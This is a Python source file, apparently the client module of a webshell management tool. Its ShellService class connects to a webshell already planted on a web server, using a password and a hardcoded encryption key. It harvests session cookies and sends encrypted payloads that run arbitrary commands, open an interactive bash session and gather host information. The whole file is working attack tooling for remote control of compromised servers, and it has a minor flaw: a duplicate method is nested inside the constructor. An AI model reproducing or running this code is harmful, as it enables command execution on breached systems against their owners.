# -*- encoding: utf-8 -*-


from core.ShellEntity import ShellEntity
from common import Types

from components.Request import RequestUtils
import json
import random


class ShellService:
    def __init__(self, shellEntity: ShellEntity, userAgent,isUseProxies=False, **kwargs):#初始化
        self.shellEntity: ShellEntity = shellEntity
        self.userAgent: str = userAgent
        self.currentUrl: str = shellEntity.url
        self.currentType: Types.LanguageType = shellEntity.languageType
        self.currentPassword: str = shellEntity.password
        self.currentHeaders: dict = {'User-Agent': userAgent}
        self.currentHeaders: dict = {'Accept': 'text/html,image/gif,  application/atom+xml ,application/xhtml+xml,image/jpeg, *; q=.2, */*; q=.2'}
        self.currentIsUseProxies: bool = isUseProxies
        self.currentProxies = {}
        if self.currentIsUseProxies:
            if not kwargs.get('proxies'):
                self.currentProxies = {'http': 'http://127.0.0.1:8080',
                                       'https': 'https://127.0.0.1:8080'}
            else:
                self.currentProxies = kwargs['proxies']

        if self.currentType is Types.LanguageType.PHP:
            self.currentHeaders['Content-type'] = 'application/x-www-form-urlencoded;charset=utf-8'
        # 连接
        self.currentKey ='e45e329feb5d925b'
        self.__TryConnect()
        self.getBasicInfo()

        def getBasicInfo(self):
            fileName = Types.PlayLoadFileName.BasicInfo.value
            paramsDict = {}
            return self.__sendPostRequest1(fileName, paramsDict)

    def __TryConnect(self):#次get请求,cookie和密钥的获取
        #if self.currentUrl.count('?'):
            #url = self.currentUrl + '&' + self.currentPassword + '=' + str(int(random.random() * 1000))
        #else:
            #url = self.currentUrl + '?' + self.currentPassword + '=' + str(int(random.random() * 1000))
        #resp = RequestUtils.sendRequest(url=url, headers=self.currentHeaders, isUseProxies=self.currentIsUseProxies)
        resp=self.getEcho()
        if RequestUtils.parseResponse(resp, Types.ResponseField.statusCode) == 200:
            self.currentHeaders['Cookie'] = RequestUtils.parseResponse(resp, Types.ResponseField.cookie,
                                                                       cookieToStr=True)
            self.currentHeaders['Cookie'] += '; path=/'
            return RequestUtils.parseResponse(resp, Types.ResponseField.body)
        if RequestUtils.parseResponse(resp, Types.ResponseField.statusCode) == 302:
            pass
        if RequestUtils.parseResponse(resp, Types.ResponseField.statusCode) == 404:
            pass
        if RequestUtils.parseResponse(resp, Types.ResponseField.statusCode) >= 500:
            pass


    def __sendPostRequest(self, fileName, paramsDict):#发送post的请求
        return RequestUtils.requestAndParse(self.currentKey, fileName, paramsDict, self.currentType,
                                            self.currentUrl,
                                            self.currentHeaders, self.currentIsUseProxies, self.currentProxies)
    def __sendPostRequest1(self, fileName, paramsDict):#发送post的请求
        return RequestUtils.requestAndParse1(self.currentKey, fileName, paramsDict, self.currentType,
                                            self.currentUrl,
                                            self.currentHeaders, self.currentIsUseProxies, self.currentProxies)

    def runCmd(self, Cmd):#跑cmd的方法
        paramsDict = {'Cmd': Cmd}
        fileName = Types.PlayLoadFileName.CMD.value
        if self.currentType is Types.LanguageType.PHP:
            respDict = self.__sendPostRequest(fileName, paramsDict)
            return respDict
        if self.currentType is Types.LanguageType.JAVA:
            pass
        else:
            pass

    def realCMDOperate(self, operateType: Types.RealCMDOperateType, bashPath='', CMD=''):
        fileName = Types.PlayLoadFileName.RealCMD.value
        paramsDict = {}
        if operateType is Types.RealCMDOperateType.CREATE:
            paramsDict = {'type': 'create', 'bashPath': bashPath}
        if operateType is Types.RealCMDOperateType.STOP:
            paramsDict = {'type': 'stop'}
        if operateType is Types.RealCMDOperateType.WRITE:
            paramsDict = {'type': 'write'}
            if self.currentType is Types.LanguageType.PHP:
                paramsDict['bashPath'] = ""
            paramsDict['Cmd'] = CMD
        if operateType is Types.RealCMDOperateType.READ:
            paramsDict = {'type': 'read'}

        return self.__sendPostRequest(fileName, paramsDict)

    def getBasicInfo(self):
        fileName = Types.PlayLoadFileName.BasicInfo.value
        paramsDict = {}
        return self.__sendPostRequest(fileName, paramsDict)

    def getEcho(self):
        fileName = Types.PlayLoadFileName.Echo.value
        paramsDict = {}
        return self.__sendPostRequest1(fileName, paramsDict)
